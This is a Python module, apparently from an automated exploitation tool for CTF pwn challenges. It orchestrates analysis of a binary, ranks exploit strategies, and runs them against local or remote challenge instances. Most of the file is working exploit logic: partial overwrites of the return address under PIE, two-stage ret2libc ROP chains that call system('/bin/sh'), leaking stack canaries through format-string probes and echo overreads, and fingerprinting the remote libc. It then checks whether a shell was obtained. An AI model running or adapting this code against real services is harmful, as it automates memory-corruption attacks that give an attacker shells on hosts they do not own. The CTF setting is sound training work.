"""编排：静态事实 -> 策略排序 -> 逐条尝试 -> 验证 -> 落盘报告。"""
from __future__ import annotations

import json
import os
import re
import time
import traceback
from dataclasses import dataclass, field
from typing import Optional

from .facts import Facts, analyse
from .interact import Interaction, StepError
from .model import Challenge
from .oracle import judge_flag
from .run import Result, execute, execute_flag, _verify_timeout
from . import strategies as S


@dataclass
class Attempt:
    strategy: str
    desc: str
    ok: bool
    elapsed: float
    output: bytes = b""
    error: str = ""
    cause: str = ""

    def brief(self) -> dict:
        return {
            "strategy": self.strategy,
            "desc": self.desc,
            "ok": self.ok,
            "elapsed": round(self.elapsed, 2),
            "tail": self.output[-300:].decode("latin-1", "replace"),
            "cause": self.cause,
        }


@dataclass
class SolveResult:
    name: str
    ok: bool
    strategy: str = ""
    detail: str = ""
    elapsed: float = 0.0
    attempts: list[Attempt] = field(default_factory=list)
    facts: dict = field(default_factory=dict)
    error: str = ""
    flag_only: bool = False
    cmds: list = field(default_factory=list)

    def as_dict(self) -> dict:
        return {
            "name": self.name,
            "ok": self.ok,
            "strategy": self.strategy,
            "detail": self.detail,
            "elapsed": round(self.elapsed, 1),
            "attempt_count": len(self.attempts),
            "flag_only": self.flag_only,
            "facts": self.facts,
            "cmds": [{"cmd": c, "out": o.decode("latin-1", "replace")} for c, o in self.cmds],
            "attempts": [a.brief() for a in self.attempts],
            "error": self.error,
        }


import re as _re_mod

# 这些是「连接层面」的失败，重试没有任何意义，继续刷只会浪费时间/被平台限速。
# 命中时立即中止，并把原因说清楚——避免被误读成「payload 打不进去」。
_FATAL_RULES = [
    (_re_mod.compile(r"no running target|start or renew it", _re_mod.I),
     "题目实例已不存在。请回平台题目页点「启动 / 续期」，拿到新地址后再连"
     "（这不是利用失败，payload 没问题）"),
    (_re_mod.compile(r"Could not resolve hostname|Name or service not known|"
                     r"Temporary failure in name resolution|nodename nor servname|getaddrinfo",
                     _re_mod.I),
     "域名解析失败。请检查拼写（常见错误：.dasctf.com 写成 .dasctf.comm）"),
    (_re_mod.compile(r"Connection refused|No route to host|Connection reset by peer.*"
                     r"|timed out", _re_mod.I),
     "端口不通。请确认端口号与题目一致，且实例处于运行状态"),
]


def _fatal_hint(blob: str):
    for pat, hint in _FATAL_RULES:
        if pat.search(blob):
            return hint
    return None


def _unpack4(ret):
    """兼容 3/4 元组返回。"""
    if len(ret) >= 4:
        return ret[0], ret[1], ret[2], ret[3]
    return ret[0], ret[1], ret[2], []


def _unresolved_reason(f) -> str:
    """零计划时的归因（v7.3.0）：不允许空 attempts 静默报 FAILED。"""
    parts = []
    for u in (f.unreachable or [])[:3]:
        parts.append(f"{u['sink']}@{hex(u['call'])} 写入长度 {u['limit']} "
                     f"< 返回址距离 {u['offset']}")
    for k, v in list((f.unknowns or {}).items())[:3]:
        parts.append(f"{k}: {v}")
    if not parts:
        return "UNRESOLVED: 所有策略均未产出计划（事实齐备但无匹配策略）"
    return "UNRESOLVED: " + "；".join(parts)


def solve(ch: Challenge, max_attempts: int = 80, verbose: bool = True,
          budget: float = 240.0, post_cmds: list = None) -> SolveResult:
    t0 = time.time()
    res = SolveResult(name=ch.name, ok=False)
    try:
        ch.prepare()
    except Exception:
        res.error = traceback.format_exc(limit=2)
        res.elapsed = time.time() - t0
        return res

    f = analyse(ch)
    res.facts = {
        "prot": ch.prot.as_dict(),
        "vulns": [str(v) for v in f.vulns[:6]],
        "wins": [str(w) for w in f.wins[:6]],
        "binsh": hex(f.binsh) if f.binsh else None,
        "gadgets": {k: hex(v) for k, v in f.gadgets.items()},
        "csu": bool(f.csu),
        "mmap_rwx": hex(f.mmap_rwx) if f.mmap_rwx else None,
        "fmt_buf": f.fmt_buf,
        "libc": os.path.basename(ch.libc_path) if ch.libc_path else None,
        "notes": ch.notes,
        # v7.3.0：事实三态留痕，失败时可直接看出卡在哪一层
        "unknowns": dict(f.unknowns),
        "unreachable": list(f.unreachable),
    }
    if verbose:
        print(f"    prot={ch.prot} vulns={len(f.vulns)} wins={len(f.wins)} "
              f"binsh={hex(f.binsh) if f.binsh else None} csu={bool(f.csu)} "
              f"mmap_rwx={hex(f.mmap_rwx) if f.mmap_rwx else None} "
              f"fmt={f.fmt_buf} gadgets={len(f.gadgets)}")

    tried = 0
    deadline = t0 + budget
    for strat in S.STRATEGIES:
        if time.time() > deadline:
            res.error = "budget exhausted"
            break
        try:
            plans = list(strat(ch, f))
        except Exception:
            continue
        if not plans:
            continue
        if verbose:
            print(f"    -> {strat.__name__}: {len(plans)} plans")
        for plan in plans:
            if tried >= max_attempts or time.time() > deadline:
                res.elapsed = time.time() - t0
                return res
            tried += 1
            t1 = time.time()
            cmds = []
            if plan.tag.startswith("pie:"):
                ok, detail, out, cmds = _unpack4(_try_pie_partial(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
                if ok and plan.tag.endswith(":flag"):
                    res.flag_only = True
            elif plan.tag.startswith("canary:"):
                ok, detail, out, cmds = _unpack4(_try_canary_fmt(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            elif plan.tag.startswith("canaryecho:"):
                ok, detail, out, cmds = _unpack4(_try_canary_echo(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            elif plan.tag == "flag":
                r = execute_flag(ch, plan.steps)
                ok, detail, out = r.ok, r.note, r.output
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1,
                              r.output, r.error, cause=r.cause)
            elif plan.tag.startswith("stage1:"):
                ok, detail, out, cmds = _unpack4(_try_ret2libc(ch, f, plan, post_cmds))
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1, out)
            else:
                r = execute(ch, plan.steps, post_cmds=post_cmds)
                if not r.ok and r.error:
                    # 进程提前退出属于时序抖动，重试一次
                    r = execute(ch, plan.steps, post_cmds=post_cmds)
                ok, detail, out, cmds = r.ok, "", r.output, r.cmds
                att = Attempt(plan.strategy, plan.desc, ok, time.time() - t1,
                              r.output, r.error, cause=r.cause)
            res.cmds = cmds or []
            res.attempts.append(att)
            if not ok and getattr(ch, "host", None):
                blob = (att.error or "") + " " + (out or b"").decode("latin-1", "ignore")
                hint = _fatal_hint(blob)
                if hint:
                    res.error = "连接失败（不是利用失败）：" + hint
                    res.elapsed = time.time() - t0
                    return res
            if ok:
                res.ok = True
                import re as _re
                m = _re.search(rb"uid=\d+\(([^)]*)\)", out or b"")
                if m:
                    detail = (detail + " | " if detail else "") + m.group(0).decode("latin-1")
                if plan.tag == "flag" or (plan.tag.startswith("pie:") and plan.tag.endswith(":flag")):
                    res.flag_only = True
                res.strategy = plan.strategy
                res.detail = detail or plan.desc
                res.elapsed = time.time() - t0
                if verbose:
                    print(f"    [OK] {att.strategy} {att.desc} ({att.elapsed:.2f}s)")
                return res
    res.elapsed = time.time() - t0
    if not res.attempts and not res.error:
        res.error = _unresolved_reason(f)
    return res


# --------------------------------------------------------------------------- ret2libc
# --------------------------------------------------------------------------- PIE 部分覆盖
def _try_pie_partial(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """覆盖返回地址低 2 字节跳到 win。

    本地进程能读 /proc/<pid>/maps 拿到精确基址（nib=-1 时用它），远程只能按 tag 里的 nib 猜。
    """
    import struct
    import time as _t
    from .run import spawn, verify_shell, probe_flag, _verify_timeout

    parts = plan.tag.split(":")
    tgt, nib, kind = int(parts[1]), int(parts[2]), (parts[3] if len(parts) > 3 else "shell")
    v = next((x for x in f.vulns if x.offset), None)
    if v is None:
        return False, "no vuln", b"", []

    try:
        p = spawn(ch)
    except Exception as exc:
        return False, f"spawn failed: {exc}", b"", []

    out = b""
    try:
        _t.sleep(0.1)
        out += p.recvrepeat(0.05)

        base = None
        pid = None if os.environ.get("AUTOPWN_NO_MAPS") else getattr(p, "pid", None)
        if pid:
            try:
                with open(f"/proc/{pid}/maps") as fh:
                    for line in fh:
                        if ch.run_bin in line:
                            base = int(line.split("-")[0], 16)
                            break
            except Exception:
                base = None
        if base is not None:
            low16 = (base + tgt) & 0xFFFF
        elif nib >= 0:
            low16 = ((nib * 0x1000) + tgt) & 0xFFFF
        else:
            return False, "no maps, no nib", out, []

        buf = bytearray(b"A" * v.offset)
        for goff, gval in S._gate_offsets(f, v):
            buf[goff:goff + 4] = struct.pack("<I", gval)
        payload = bytes(buf) + struct.pack("<H", low16)

        p.send(payload)
        _t.sleep(0.3)

        if kind == "flag":
            r = probe_flag(p, wait=0.4)
            out += r.output
            if r.ok:
                return True, r.note, out, []
            # 判定交给 Oracle：真 flag 优先，其次 win reached（本地无 flag 文件）
            v = judge_flag(out)
            if v.ok:
                return True, v.detail, out, []
            return False, f"partial -> {hex(base + tgt) if base else hex(low16)}", out, []

        r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
        out += r.output
        return r.ok, "", out, r.cmds
    finally:
        try:
            p.close()
        except Exception:
            pass


def _stage2_remote_cands(ch: Challenge, f: Facts, plan: S.Plan, p, out: bytes,
                         off: int, sink: str, leak_name: str, post_cmds: list = None):
    """远程无 libc 的 stage2：按识别出的候选逐个发。

    每个候选 = {id, system, binsh, _base}；本地（_find_libc_base 命中）不走这里。
    ret2libc 的 payload 是裸 A 填充——有 canary 的题会 smash，交给 canary_echo
    （它有真 canary），这里失败属预期。
    """
    import time as _t
    from .run import verify_shell

    cands = _resolve_remote_libc(ch, f, out, leak_name, p)
    if not cands:
        return False, "leak failed", out, []
    word = ch.wordsize
    pad_len = off
    for cand in cands:
        base = cand["_base"]
        system = base + cand["system"]
        binsh = base + cand["binsh"]
        detail = (f"remote-libc[{cand['id']}] base={hex(base)} "
                  f"system={hex(system)} binsh={hex(binsh)}")
        if ch.elf.bits == 64:
            pop_rdi = f.gadgets.get("pop_rdi")
            if not pop_rdi:
                return False, "no pop rdi", out, []
            chains = [ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system)]
            if f.gadgets.get("ret"):
                chains.insert(0, ch.p64(f.gadgets["ret"]) + ch.p64(pop_rdi)
                              + ch.p64(binsh) + ch.p64(system))
        else:
            chains = [ch.p32(system) + ch.p32(0) + ch.p32(binsh)]
        for chain in chains:
            stage2 = b"A" * pad_len + chain + (b"\n" if sink in S.TERM_SINKS else b"")
            try:
                p.send(stage2)
            except Exception:
                return False, detail + " (send failed)", out, []
            _t.sleep(0.2)
            out += p.recvrepeat(0.15)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, detail, out, r.cmds
    return False, "stage2 failed (all remote-libc candidates)", out, []


def _try_ret2libc(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """同一进程内两阶段：泄漏 libc -> 回 main -> system('/bin/sh')。

    注意：stage2 必须复用 stage1 的进程，否则 ASLR 变了，算出来的地址全废。
    """
    import time as _t
    from .run import spawn, verify_shell

    _, _, meta = plan.tag.partition(":")
    leak_name, off_s, sink = (meta.split(":") + ["", ""])[:3]
    libc = ch.libc_elf
    if libc is None:
        return False, "no libc", b""
    off = int(off_s)

    try:
        p = spawn(ch)
    except Exception as exc:
        return False, f"spawn failed: {exc}", b""

    it = Interaction(p, needle_timeout=_verify_timeout(ch))
    try:
        _t.sleep(0.1)
        it.read(0.08)
        try:
            # 重放完整步骤（含 scanf 前置输入与菜单前缀），不再只发最后一段
            it.run_steps(plan.steps, final_sleep=0.25, final_read=0.25)
        except StepError as exc:
            return False, str(exc), exc.partial
        out = it.buf

        # 带循环退出闸的程序（repeater：scanf(%d) 决定是否继续）在 ROP 前还卡在
        # scanf —— 喂一个非 0 数字触发退出，ROP 才会执行。
        # 【只对远程双泄 plan 发】（desc 带 '+printf'）：ch13 这类「fgets 循环等第二段
        # 输入」的题没有闸，多喂一行会把 stage2 顶掉一位（实测回归）。
        if "+printf" in plan.desc:
            try:
                p.send(b"9\n")
                _t.sleep(0.3)
                out += p.recvrepeat(0.3)
            except Exception:
                pass

        base = _find_libc_base(out, libc, leak_name)
        if base is None:
            # 远程 + 没给 libc 文件：low12 指纹识别，逐候选尝试 stage2（v7.0.4）
            return _stage2_remote_cands(ch, f, plan, p, out, off, sink,
                                        leak_name, post_cmds)

        system = base + libc.sym["system"]
        try:
            binsh = base + next(libc.search(b"/bin/sh"))
        except StopIteration:
            return False, "no /bin/sh in libc", out

        if ch.elf.bits == 64:
            pop_rdi = f.gadgets.get("pop_rdi")
            if not pop_rdi:
                return False, "no pop rdi", out
            chains = [ch.p64(pop_rdi) + ch.p64(binsh) + ch.p64(system)]
            if f.gadgets.get("ret"):
                chains.append(ch.p64(f.gadgets["ret"]) + ch.p64(pop_rdi)
                              + ch.p64(binsh) + ch.p64(system))
        else:
            chains = [ch.p32(system) + ch.p32(0) + ch.p32(binsh)]

        detail = f"libc_base={hex(base)} system={hex(system)} binsh={hex(binsh)}"
        for chain in chains:
            stage2 = b"A" * off + chain + (b"\n" if sink in S.TERM_SINKS else b"")
            try:
                p.send(stage2)
            except Exception:
                break
            _t.sleep(0.2)
            out += p.recvrepeat(0.15)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, detail, out, r.cmds
        return False, "stage2 failed: " + detail, out
    finally:
        try:
            p.close()
        except Exception:
            pass


def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """fmt 泄漏 canary -> 溢出泄漏 GOT -> 回 main -> system('/bin/sh')，全程同进程。"""
    import time as _t
    from .run import spawn, verify_shell

    _, _, meta = plan.tag.partition(":")
    off_s, sink = (meta.split(":") + [""])[:2]
    off = int(off_s)
    leak_name = "puts" if ch.plt("puts") else "write"
    leak_plt = ch.plt(leak_name)
    got = ch.got(leak_name)
    main = ch.var("main")
    libc = ch.libc_elf
    if not (leak_plt and got and main and libc):
        return False, "missing plt/got/libc", b""

    bits = ch.elf.bits
    # probe 长度受第一次 read 的 size_limit 限制（cannary 实测：184B probe > 32B
    # limit 被 read 截断，fmt 串残缺 → 泄漏失败）。用位置参数 %N$p 精准打 canary
    # 附近的槽：canary arg = 6 + canary_off/wordsize（amd64），前后各扫 2 格。
    probe_limits = [v.size_limit for v in f.vulns
                    if v.sink in S.TERM_SINKS or v.sink == "read"]
    probe_limit = min((x for x in probe_limits if x), default=120)
    # canary_off 由帧偏移推算（与 stage1 同公式）
    word = ch.wordsize
    canary_off0 = (off - word) - (8 if bits == 64 else 12)
    # printf(fmt) 变参 arg1=rsi…arg5=r9、arg6=[rsp] 起；canary 落 arg6+canary_off/word
    # （cannary 实测 arg11 = 6 + 40/8）
    arg0 = 6 + (canary_off0 // word if canary_off0 > 0 else 0)
    fmt_dollar = bytes([0x24])   # 显式 0x24，防外层 shell/python 转义差异
    args_n = [a for a in range(max(6, arg0 - 2), arg0 + 3)]
    probe = b"AAAA" + b"".join(b"-%" + str(a).encode() + fmt_dollar + b"p"
                               for a in args_n)
    if len(probe) > probe_limit:
        # 位置串太长：只打中心格（cannary：'AAAA-%11$p' = 11 字节 ✓）
        probe = b"AAAA-%" + str(arg0).encode() + fmt_dollar + b"p"

    for cand in range(8):
        try:
            p = spawn(ch)
        except Exception as exc:
            return False, f"spawn failed: {exc}", b""
        out = b""
        try:
            _t.sleep(0.1)
            out += p.recvrepeat(0.06)
            # ---- fmt 漏洞可能位于「先跑的一次 read + printf」（cannary 型：vuln 函数
            # 先执行、printf(buf) 只跑一次），泄漏必须喂给 fmt 所在的那次 read；
            # 溢出 read 是另一次。两个 vuln 按 call_addr 排序：fmt 的 sink 是 printf
            # 前紧邻的 read（size_limit 小），溢出是后一个（limit 大）。
            # 引擎按 (probe → 等) → (stage1 → 等) 两步发送，天然适配先后顺序。
            p.send(probe + b"\n" if sink in S.TERM_SINKS else probe)
            _t.sleep(0.2)
            out += p.recvrepeat(0.2)
            cands = S._canary_candidates(out, bits)
            if __import__("os").environ.get("AUTOPWN_DEBUG"):
                print(f"      [dbg] canary cands={[hex(c) for c in cands]} out={out[:60]!r}")
            if not cands:
                return False, "no canary candidate", out
            if cand >= len(cands):
                return False, "candidates exhausted", out
            canary = cands[cand]

            # ---- 第二次 gets：带 canary 溢出。有 backdoor（execve/system win）时
            # 直接跳 win（cannary 型：无 pop_rdi 也能打）；否则走泄漏 GOT 回 main。
            rbp_disp = off - ch.wordsize
            canary_off = rbp_disp - (8 if bits == 64 else 12)
            if canary_off <= 0:
                continue
            pad = b"A" * canary_off
            tail = b"B" * (off - canary_off - ch.wordsize)
            shell_win = f.shell_win
            if shell_win is not None:
                # 有 win：直接 ret 到 win（cannary 型 backdoor 自带 execve('/bin/sh')，
                # 无参数需求——本地远程通吃；ret2libc 路线反而需要 pop_rdi）
                if bits == 64:
                    ret_g = f.gadgets.get("ret")
                    chain = (ch.p64(ret_g) if ret_g else b"") + ch.p64(shell_win.addr)
                else:
                    chain = ch.p32(shell_win.addr)
                stage1 = pad + ch.p64(canary) + tail + chain
                p.send(stage1 + (b"\n" if sink in S.TERM_SINKS else b""))
                _t.sleep(0.3)
                out += p.recvrepeat(0.3)
                r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
                out += r.output
                if r.ok:
                    return True, f"canary={hex(canary)} -> win {hex(shell_win.addr)}", out, r.cmds
                continue
            if bits == 64:
                ret = f.gadgets.get("ret")
                pop_rdi = f.gadgets.get("pop_rdi")
                if not pop_rdi:
                    return False, "no pop rdi", out
                chain = (ch.p64(ret if ret else pop_rdi) if ret else b"")
                chain += ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt) + ch.p64(main)
            else:
                chain = ch.p32(leak_plt) + ch.p32(main) + ch.p32(got)
            stage1 = pad + ch.p64(canary) + tail + chain
            p.send(stage1 + (b"\n" if sink in S.TERM_SINKS else b""))
            _t.sleep(0.25)
            out += p.recvrepeat(0.25)

            base = _find_libc_base(out, libc, leak_name)
            if __import__("os").environ.get("AUTOPWN_DEBUG"):
                print(f"      [dbg] canary={hex(canary)} stage1 out={out[-80:]!r} base={base and hex(base)}")
            if base is None:
                continue
            system = base + libc.sym["system"]
            try:
                binsh = base + next(libc.search(b"/bin/sh"))
            except StopIteration:
                continue

            # ---- 回到 main 后：第一次 gets 喂空行，第二次 gets 打通
            p.send(b"\n")
            _t.sleep(0.12)
            if bits == 64:
                chain2 = (ch.p64(f.gadgets["ret"]) if f.gadgets.get("ret") else b"")
                chain2 += ch.p64(f.gadgets["pop_rdi"]) + ch.p64(binsh) + ch.p64(system)
            else:
                chain2 = ch.p32(system) + ch.p32(0) + ch.p32(binsh)
            stage2 = pad + ch.p64(canary) + tail + chain2
            p.send(stage2 + (b"\n" if sink in S.TERM_SINKS else b""))
            _t.sleep(0.2)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, f"canary={hex(canary)} base={hex(base)}", out, r.cmds
        finally:
            try:
                p.close()
            except Exception:
                pass
    return False, "canary attempts failed", b""


def _try_canary_echo(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = None):
    """canary-echo 泄漏 -> ret2libc（repeater 型），全程同进程三阶段。

    阶段 1：发 buf_size+1 字节（40A + 'B'）盖掉 canary 的 0x00 LSB，
            puts(buf) 回显越过 LSB 带出 canary[1:8]，重组 b"\\x00" + leak7。
    阶段 2：真 canary + 假 rbp + pop_rdi(puts@got) + puts@plt + 重入函数体（带 prologue）
            —— 重入循环体会让 rbp 保持垃圾值，退出时 canary 检查必 smash（实测踩过）。
    阶段 3：回到 main 后再溢出一次：真 canary + 假 rbp + ret 对齐 + pop_rdi(binsh) + system
            —— ret 对齐不能省（实测缺它 do_system 内 SIGSEGV）。
    """
    import time as _t
    from .run import spawn, verify_shell, _verify_timeout

    _, _, meta = plan.tag.partition(":")
    off_s, sink = (meta.split(":") + [""])[:2]
    off = int(off_s)
    libc = ch.libc_elf
    if libc is None:
        return False, "no libc", b""

    if f.echo_leak is None:
        return False, "no echo structure", b""
    vi, buf_size = f.echo_leak
    v = f.vulns[vi]
    if not v.func_entry:
        return False, "no func entry", b""
    # canary 在 rbp-8，距 buf 起点 = buf_size - wordsize（repeater: 48-8=40）
    word = ch.wordsize
    canary_pos = buf_size - word

    leak_plt = ch.plt("puts")
    got = ch.got("puts")
    pop_rdi = f.gadgets.get("pop_rdi")
    ret_g = f.gadgets.get("ret")
    if not (leak_plt and got and pop_rdi):
        return False, "missing plt/got/pop_rdi", b""
    # payload 至少要覆盖到 ret（canary_pos + canary + saved rbp + ret 4 段都要装得下）
    if off <= canary_pos + word * 2 - 1:
        return False, "window too small", b""

    fake_rbp = _bss_or_fallback(ch)

    for attempt in range(8):
        try:
            p = spawn(ch)
        except Exception as exc:
            return False, f"spawn failed: {exc}", b""
        out = b""
        try:
            _t.sleep(0.1)
            out += p.recvrepeat(0.08)

            # ---- 阶段 1：盖 LSB 泄 canary
            probe = b"A" * canary_pos + b"B"
            try:
                p.send(probe)
            except Exception:
                break
            _t.sleep(0.25)
            out += p.recvrepeat(0.3)
            leak7 = _extract_canary_tail(out, probe)
            if leak7 is None:
                p.close()
                continue
            canary = b"\x00" + leak7              # 内存序：LSB 在前

            # probe 轮的 scanf/getchar 还在等数字：先喂 0 让它消费完、回到循环顶，
            # 否则 stage1 的字节会被 scanf('%d') 吃进 stdio 缓冲（匹配失败留在缓冲区），
            # 后面的 read 拿到的是残缺输入 —— 手工验证时踩过的坑。
            try:
                p.send(b"0\n")
            except Exception:
                break
            _t.sleep(0.2)
            out += p.recvrepeat(0.25)

            # ---- 阶段 2：canary + ROP 泄漏 libc 后重入 main
            # 程序仍在循环里：先喂一个 0 让本轮 read 消化完、回到 read 前（如果需要）
            chain = (ch.p64(pop_rdi) + ch.p64(got) + ch.p64(leak_plt)
                     + ch.p64(v.func_entry))
            stage1 = (b"A" * canary_pos + canary
                      + ch.p64(fake_rbp) + chain)
            if sink in S.TERM_SINKS:
                stage1 += b"\n"
            if len(stage1) > (v.size_limit or off + 0x200):
                p.close()
                continue
            try:
                p.send(stage1)
            except Exception:
                break
            _t.sleep(0.25)
            out += p.recvrepeat(0.3)
            # stage1 已占住本轮 read；scanf 等数字：喂非 0 → 退出循环 → canary 检查
            # （值正确应通过）→ leave;ret 落在 ROP 上 → puts(got) 泄漏 → 重入 main
            p.send(b"9\n")
            _t.sleep(0.4)
            out += p.recvrepeat(0.5)
            base = _find_libc_base(out, libc, "puts")
            remote_cands = []
            if base is None:
                # 远程无 libc：low12 指纹识别，逐候选尝试（v7.0.4）
                remote_cands = _resolve_remote_libc(ch, f, out, "puts", p)
                if not remote_cands:
                    p.close()
                    continue
            elif _REMOTE_LIBC_STATE.get("cand"):
                remote_cands = [dict(_REMOTE_LIBC_STATE["cand"], _base=base)]
            if base is not None and not remote_cands:
                system = base + libc.sym["system"]
                try:
                    binsh = base + next(libc.search(b"/bin/sh"))
                except StopIteration:
                    return False, "no /bin/sh in libc", out            # 对候选发 stage2。单符号识别可能有多个候选（页对齐区分不了）：
            # 一个候选打错地址进程就死 → 本连接只能试一个。用 attempt 轮换起点，
            # 外层 for attempt 会换新连接 + 新 canary，正好一连接试一候选。
            start = _REMOTE_LIBC_STATE.get("cand_idx", 0)
            if remote_cands:
                cand = remote_cands[start % len(remote_cands)]
                _REMOTE_LIBC_STATE["cand_idx"] = start + 1
                tag = f" remote-libc[{cand['id']}]"
            else:
                cand = {"_base": base, "id": "local", "system": 0, "binsh": 0}
                cand["system"] = base + libc.sym["system"] - base
                cand["binsh"] = base + next(libc.search(b"/bin/sh")) - base
                tag = ""
            base_c = cand["_base"]
            stage2 = (b"A" * canary_pos + canary + ch.p64(fake_rbp)
                      + ((ch.p64(ret_g) if ret_g else b""))
                      + ch.p64(pop_rdi) + ch.p64(base_c + cand["binsh"])
                      + ch.p64(base_c + cand["system"]))
            if sink in S.TERM_SINKS:
                stage2 += b"\n"
            try:
                p.send(stage2)
            except Exception:
                continue
            _t.sleep(0.3)
            try:
                p.send(b"9\n")
            except Exception:
                continue              # 这个候选打崩了进程：换连接试下一个
            _t.sleep(0.5)
            r = verify_shell(p, timeout=_verify_timeout(ch), post_cmds=post_cmds)
            out += r.output
            if r.ok:
                return True, (f"canary={hex(int.from_bytes(canary, 'little'))} "
                              f"base={hex(base_c)}{tag}"), out, r.cmds
            continue

        finally:
            try:
                p.close()
            except Exception:
                pass
    return False, "echo attempts failed", b""


def _extract_canary_tail(out: bytes, probe: bytes) -> Optional[bytes]:
    """从回显里取 probe 之后的 7 字节（canary[1:8]）；含换行/不足 → None。"""
    idx = out.rfind(probe)
    if idx < 0:
        return None
    tail = out[idx + len(probe):]
    nl = tail.find(b"\n")
    if nl >= 0:
        tail = tail[:nl]
    if len(tail) < 7:
        return None
    return tail[:7]


def _bss_or_fallback(ch: Challenge) -> int:
    """假 rbp：用 bss 往后一点（可写即可，leave;ret 只借它中转一次）。"""
    try:
        return ch.elf.bss() + 0x200
    except Exception:
        return 0x602000


_REMOTE_LIBC_STATE: dict = {}


def _parse_leaks(out: bytes, leak_name: str) -> Optional[dict]:
    """从 stage1 输出解析 1~2 个泄漏值。

    两种形态：
      puts 型——每个泄漏值独占一行（以 \\0 截断），按行 6 字节回读；
      write 型——write(1, got, 8) 连续输出 16 字节（含 \\0），两段背靠背无分隔，
      按「8 字节对滑窗 + 段内 6 字节有效位」提取。
    """
    vals: list[int] = []

    def _push(v: int):
        if 0x7F0000000000 <= v < 0x800000000000 and v % 0x1000 != 0:
            vals.append(v)

    for line in out.split(b"\n"):
        if not (4 <= len(line) <= 8):
            continue
        for ln in (6, 5):
            if len(line) >= ln:
                v = int.from_bytes(line[:ln].ljust(8, b"\x00"), "little")
                _push(v)
                break
    if not vals:
        # write 型：找「8 字节对齐、两段连续 0x7f 开头高位」的滑动窗口
        i = 0
        while i + 8 <= len(out):
            v = int.from_bytes(out[i:i + 6].ljust(8, b"\x00"), "little")
            if 0x7F0000000000 <= v < 0x800000000000:
                _push(v)
                i += 8
            else:
                i += 1
    if not vals:
        return None
    uniq = list(dict.fromkeys(vals))
    if len(uniq) == 1:
        return {leak_name: uniq[0]}
    # 第二个符号名由调用方策略决定（write 双泄时 got2=read/printf）
    return {leak_name: uniq[0], "read": uniq[1]}


def _resolve_remote_libc(ch: Challenge, f: Facts, out: bytes,
                         leak_name: str, p) -> list[dict]:
    """远程无 libc 时：把 stage1 的泄漏交给 libcsearch，返回逐候选尝试列表。

    每个候选 = {id, system, binsh, puts, ...}；base 已按各候选 puts 偏移
    校验页对齐。空列表 = 识别失败（如实 FAILED，不放宽判据）。
    """
    from . import libcsearch as LC
    vals = _parse_leaks(out, leak_name)
    if not vals:
        return []
    leak = vals[leak_name]
    out_cands = []
    for cand in LC.candidates(vals):
        base = LC.rebase(leak, cand, leak_name)
        if base is not None:
            c = dict(cand)
            c["_base"] = base
            out_cands.append(c)
    if out_cands:
        ch.notes.append(f"remote libc candidates: "
                        + ", ".join(c["id"] for c in out_cands))
    return out_cands


def _find_libc_base(out: bytes, libc, name: str) -> Optional[int]:
    sym = int(libc.sym.get(name, 0) or 0)
    if not sym:
        return None
    bits64 = libc.bits == 64
    lo, hi = (0x700000000000, 0x800000000000) if bits64 else (0xE0000000, 0x100000000)
    low12 = sym & 0xFFF
    for p in range(len(out)):
        for ln in ((6, 8) if bits64 else (4,)):
            chunk = out[p:p + ln]
            if len(chunk) < 4:
                continue
            v = int.from_bytes(chunk.ljust(8, b"\x00"), "little") if bits64 \
                else int.from_bytes(chunk.ljust(4, b"\x00")[:4], "little")
            if (v & 0xFFF) != low12:
                continue
            base = v - sym
            if lo <= base < hi and base % 0x1000 == 0:
                return base
    return None


def solve_many(paths: list[str], out_dir: str, **kw) -> list[SolveResult]:
    os.makedirs(out_dir, exist_ok=True)
    results = []
    for p in paths:
        ch = Challenge(p)
        print(f"[*] {ch.name}: {ch.bin_src}")
        res = solve(ch, **kw)
        results.append(res)
        status = "SOLVED" if res.ok else "FAILED"
        print(f"    => {status} {res.strategy} {res.detail} ({res.elapsed:.1f}s, "
              f"{len(res.attempts)} attempts)")
        with open(os.path.join(out_dir, f"{ch.name}.json"), "w", encoding="utf-8") as fh:
            json.dump(res.as_dict(), fh, ensure_ascii=False, indent=2)
    return results
